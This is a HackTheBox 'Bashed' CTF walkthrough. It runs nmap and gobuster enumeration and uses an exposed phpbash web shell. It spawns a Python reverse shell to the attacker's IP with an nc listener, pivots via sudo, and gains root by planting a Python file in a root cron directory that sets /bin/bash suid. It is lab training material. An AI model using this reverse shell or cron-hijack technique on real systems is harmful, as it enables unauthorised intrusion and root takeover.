### Bashed HackTheBox

### Difficulty = Easy

### IP Address = 10.10.10.68

Nmap Scan:

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Bashed]
└─$ nmap -sCV -A 10.10.10.68 -p80 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-29 01:46 WAT
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.10.10.68
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.79 seconds
```

Checking the web page shows this
![image](https://user-images.githubusercontent.com/113513376/215297851-30237604-833e-4e17-8c9c-a0469eb136d6.png)

Only one blog post on reading i get this
![image](https://user-images.githubusercontent.com/113513376/215297885-fdc29c4a-ee69-4b72-bb8d-858b55c068e4.png)

```
phpbash helps a lot with pentesting.
I have tested it on multiple different servers and it was very useful. 
I actually developed it on this exact server!
```

Cool he says he developed it on this exact server 

Now lets fuzz for directories

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Bashed]
└─$ gobuster dir -u http://10.10.10.68/ -w /usr/share/wordlists/dirb/common.txt 2>/dev/null 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/01/29 01:54:59 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/index.html           (Status: 200) [Size: 7743]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
/server-status        (Status: 403) [Size: 299]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
===============================================================
2023/01/29 01:56:51 Finished
===============================================================
```

Cool we have /dev directory lets see its content
![image](https://user-images.githubusercontent.com/113513376/215298050-bdb38ed3-5768-49e4-b48d-c2f7d43b1bcc.png)

Now thats interesting we have the phpbash shell in it

Lets open it up 
![image](https://user-images.githubusercontent.com/113513376/215298081-413a393a-4463-42cc-9529-acc7ade9079e.png)

Now lets get a stable reverse shell

```
┌──(mark__haxor)-[~/Desktop/Tools]
└─$ ./shellgen.sh -t python -I tun0 -p 80          
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.7",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Now back on the listener

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Bashed]
└─$ nc -lvnp 80                               
listening on [any] 80 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.68] 46308
$ 

```

Now lets stabilize the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
reset
```

Checking for sudo permission for user www-data shows we can run ALl as scriptmanager

```
www-data@bashed:/$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Now lets get shell as scriptmanager

```
www-data@bashed:/$ sudo -u scriptmanager bash
scriptmanager@bashed:/$ cd   
scriptmanager@bashed:~$ ls -al
total 28
drwxr-xr-x 3 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 4 root          root          4096 Dec  4  2017 ..
-rw------- 1 scriptmanager scriptmanager    2 Dec  4  2017 .bash_history
-rw-r--r-- 1 scriptmanager scriptmanager  220 Dec  4  2017 .bash_logout
-rw-r--r-- 1 scriptmanager scriptmanager 3786 Dec  4  2017 .bashrc
drwxr-xr-x 2 scriptmanager scriptmanager 4096 Dec  4  2017 .nano
-rw-r--r-- 1 scriptmanager scriptmanager  655 Dec  4  2017 .profile
```

Now i'll upload pspy and run it

On running it i see a cron process running as root 

```
2023/01/28 17:11:01 CMD: UID=0    PID=15879  | /usr/sbin/CRON -f 
2023/01/28 17:11:01 CMD: UID=0    PID=15881  | python test.py 
2023/01/28 17:11:01 CMD: UID=0    PID=15880  | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
```

Now lets check out the /scripts directory

```
scriptmanager@bashed:/scripts$ ls
test.py  test.txt
scriptmanager@bashed:/scripts$ cat test.
cat: test.: No such file or directory
scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ cat test.txt;echo
testing 123!
scriptmanager@bashed:/scripts$ 
```

Now here' what the cron does

```
1. It changed directory to /scripts
2. It then does a loop to run any python on any file which has an extension .py in that directory
3. After that it stops
```

Cool from this we know that any py file in that directory will be run as root

And also we have write access over that directory

So lets create a malicious python file to set bash as suid

```
scriptmanager@bashed:/scripts$ cat suid.py 
import os

os.system("chmod +s /bin/bash")
scriptmanager@bashed:/scripts$
```

Now we wait xD

After few seconds the cron runs and execute all *.py program
Now lets get root

```
scriptmanager@bashed:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 Jun 24  2016 /bin/bash
scriptmanager@bashed:~$ bash -p
bash-4.3# cd /root
bash-4.3# ls -al
total 28
drwx------  3 root root 4096 Jun  2  2022 .
drwxr-xr-x 23 root root 4096 Jun  2  2022 ..
lrwxrwxrwx  1 root root    9 Jun  2  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3121 Dec  4  2017 .bashrc
drwxr-xr-x  2 root root 4096 Jun  2  2022 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Dec  4  2017 .selected_editor
-r--------  1 root root   33 Jan 28 16:42 root.txt
bash-4.3#
```

And we're done


<br> <br>
[Back To Home](../../index.md)
<br>
